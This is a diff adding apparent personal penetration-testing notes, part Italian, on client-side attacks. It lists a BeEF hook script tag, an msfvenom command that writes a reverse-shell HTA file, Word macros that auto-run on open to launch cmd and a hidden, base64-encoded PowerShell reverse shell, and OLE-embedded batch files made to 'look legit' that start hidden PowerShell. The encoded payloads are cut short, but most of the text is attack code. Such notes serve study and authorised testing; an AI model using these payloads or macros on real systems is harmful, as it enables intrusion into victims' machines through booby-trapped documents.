@@ -1,0 +1,88 @@
+BEEF:
+    sudo beef-xss
+
+    http://127.0.0.1:3000/ui/panel          (acedi con beef:password)
+    Hook: <script src="http://<IP>:3000/hook.js"></script>
+    Example: <script src="http://127.0.0.1:3000/hook.js"></script>
+
+
+
+
+HTML APPLICATIONS (hta):
+    - if a html file is created with extension .hta instead of .html, internet explorer will automatically interpret it as a HTML Application and execute it with mshta.exe (with user permissions) (works with internet explorer and sometimes microsoft edge)
+    - visto che viene eseguito fuori dai limiti del browser pè possibile sfruttare anche features deprecate o insicure che sarebbero altrimenti bloccate dal browser stesso, come ActiveXObject
+    https://github.com/fingerprintjs/fingerprintjs
+    https://github.com/LukasDrgon/fingerprintjs2
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
+
+
+MICROSOFT WORD,EXCEL MACRO:
+    //on word:  View > Macros
+    //il documento che le contiene va salvato o come .docm o come .doc ma non con il nuovo formato .docx che non supporta embedded macros
+    //basic structure
+         Sub MyMacro()
+            ' comment
+        End Sub
+
+    //start cmd line using activex
+        Sub MyMacro()
+            CreateObject("Wscript.Shell").Run "cmd"                 
+        End Sub
+
+
+    //start macro automatically when document is open with AutoOpen() and when an open document is re-opened with Document_Open()
+    Sub AutoOpen()
+        MyMacro
+    End Sub
+    Sub Document_Open()
+        MyMacro
+    End Sub
+    Sub MyMacro()
+        CreateObject("Wscript.Shell").Run "cmd"
+    End Sub
+
+    //create a reverse shell with powershell (payload generated with msfvenom)
+    //must the str many times because there i a limit of 255 characters for literal strings
+    Sub AutoOpen()
+        MyMacro
+    End Sub
+    Sub Document_Open()
+        MyMacro
+    End Sub
+    Sub MyMacro()
+        Dim Str As String
+
+        Str="powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
+        Str=Str+"QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
+        Str=Str+"TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
+            .
+            .
+            .
+        Str=Str+"AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
+        Str=Str+"QA="
+        CreateObject("Wscript.Shell").Run Str
+    End Sub
+
+
+OFFICE OLE (OBJECT LINKING AND EMBEDDING):
+    //Insert > Object           //modify appearance to make it look legit
+    //Add batch files to documents, for example start.bat
+    START cmd.exe
+
+    START powershell.exe -nop -w hidden -e gB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZ..... 
+    // -nop -> non esegue user profile (operazioni specifiche per ogni utente che potrebber compromettere l'esecuzione) -w hidden -> stile della finestra, hidden non la mostra, -e -> codice da eseguire codificato in base 64 da generare con msfvenom
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
